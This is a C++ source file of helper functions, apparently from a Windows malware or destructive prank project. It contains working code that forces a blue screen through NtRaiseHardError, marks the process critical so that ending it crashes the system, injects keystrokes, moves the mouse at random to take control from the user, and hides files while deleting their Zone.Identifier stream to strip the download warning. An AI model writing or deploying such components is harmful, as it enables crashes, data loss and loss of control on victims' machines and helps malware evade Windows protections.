#include "soprano.h"

#define BreakOnTermination 0x1D

typedef enum _PROCESS_INFORMATION_CLASS {
	ProcessBasicInformation = 0,
	ProcessDebugPort = 7,
	ProcessWow64Information = 26,
	ProcessImageFileName = 27,
	ProcessBreakOnTermination = 29,
	MaxProcessInfoClass
} PROCESS_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* NtSetInformationProcessFunc)(HANDLE, PROCESS_INFORMATION_CLASS, PVOID, ULONG);

typedef long NTSTATUS;
typedef NTSTATUS(NTAPI* RtlAdjustPrivilegePtr)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* NtRaiseHardErrorPtr)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
#define STATUS_ASSERTION_FAILURE ((NTSTATUS)0xC0000420L)

HHOOK keyboardHook;
HHOOK mouseHook;

namespace System
{
	VOID cls(VOID)
	{
		RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
	}

	VOID ThreadAbort(HANDLE hThread, HANDLE hHeap)
	{
		TerminateThread(hThread, 0);
		HeapDestroy(hHeap);
		CloseHandle(hThread);
	}

	LPCWSTR StartupPath()
	{
		static WCHAR path[MAX_PATH];
		if (GetModuleFileNameW(NULL, path, MAX_PATH))
		{
			WCHAR* pos = wcsrchr(path, L'\\');
			if (!pos)
			{
				pos = wcsrchr(path, L'/');
			}
			if (pos)
			{
				*pos = L'\0';
			}
			return path;
		}
		return NULL;
	}

	LPCWSTR PathCombine(LPCWSTR PathOrFile1, LPCWSTR PathOrFile2)
	{
		static WCHAR filePath[MAX_PATH];
		lstrcpyW(filePath, PathOrFile1);
		lstrcatW(filePath, PathOrFile2);
		return filePath;
	}

	VOID BSOD(VOID)
	{
		BOOLEAN bl;
		ULONG Response;

		HMODULE ntdll = GetModuleHandleA("ntdll.dll");

		auto RtlAdjustPrivilege = (RtlAdjustPrivilegePtr)GetProcAddress(ntdll, "RtlAdjustPrivilege");
		auto NtRaiseHardError = (NtRaiseHardErrorPtr)GetProcAddress(ntdll, "NtRaiseHardError");

		RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response);
	}

	// Function for enable mode de debug
	BOOL EnableDebugPrivilege(VOID)
	{
		HANDLE hToken;
		TOKEN_PRIVILEGES tokenPrivileges;

		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		{
			return false;
		}

		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tokenPrivileges.Privileges[0].Luid))
		{
			CloseHandle(hToken);
			return false;
		}

		tokenPrivileges.PrivilegeCount = 1;
		tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
		{
			CloseHandle(hToken);
			return false;
		}

		CloseHandle(hToken);
		return GetLastError() == ERROR_SUCCESS;
	}

	// Function to Force BSOD
	VOID SetProcessCritical(VOID)
	{
		EnableDebugPrivilege();
		HANDLE hProcess = GetCurrentProcess();

		HMODULE hNtdll = LoadLibraryA("ntdll.dll");
		auto NtSetInformationProcess = (NtSetInformationProcessFunc)GetProcAddress(hNtdll, "NtSetInformationProcess");

		ULONG isCritical = 1; // TRUE
		NtSetInformationProcess(hProcess, (PROCESS_INFORMATION_CLASS)BreakOnTermination, &isCritical, sizeof(isCritical));

		FreeLibrary(hNtdll);
	}

	VOID TypeText(LPCWSTR text, DWORD time) 
	{
		for (int i = 0; text[i] != L'\0'; ++i) 
		{
			wchar_t c = text[i];
			SHORT key = VkKeyScan(c);
			BYTE vk = key & 0xFF;
			BYTE shift = (key >> 8) & 0xFF;

			if ((shift & 1) != 0) 
			{
				keybd_event(0x10, 0, 0, 0);
			}

			keybd_event(vk, 0, 0, 0);
			keybd_event(vk, 0, KEYEVENTF_KEYUP, 0);

			if ((shift & 1) != 0) 
			{
				keybd_event(0x10, 0, KEYEVENTF_KEYUP, 0);
			}

			Sleep(time);
		}
	}

	VOID PressKey(BYTE key, BYTE key2, BYTE key3)
	{

		keybd_event(key, 0, 0, 0);
		keybd_event(key2, 0, 0, 0);


		keybd_event(key, 0, KEYEVENTF_KEYUP, 0);
		keybd_event(key2, 0, KEYEVENTF_KEYUP, 0);


		Sleep(100);
		keybd_event(key3, 0, 0, 0);
		keybd_event(key3, 0, KEYEVENTF_KEYUP, 0);
	}

	DWORD WINAPI MouseNoPermi(LPVOID a)
	{
		while (1)
		{
			int x = GetSystemMetrics(SM_CXSCREEN);
			int y = GetSystemMetrics(SM_CYSCREEN);

			int newX = rand() % x;
			int newY = rand() % y;

			SetCursorPos(newX, newY);

			Sleep(10);
		}

		return 0;
	}

	VOID FileHide(LPCWSTR orgPathFile)
	{
		DWORD attributes = GetFileAttributesW(orgPathFile);
		if (attributes == INVALID_FILE_ATTRIBUTES)
		{
			MessageBoxW(NULL, L"ERROR", L"ERROR", MB_ICONERROR);
			return;
		}

		attributes |= FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DIRECTORY;
		SetFileAttributesW(orgPathFile, attributes);

		std::wstring zoneIdentifierFile = std::wstring(orgPathFile) + L":Zone.Identifier";
		DeleteFileW(zoneIdentifierFile.c_str());
	}
}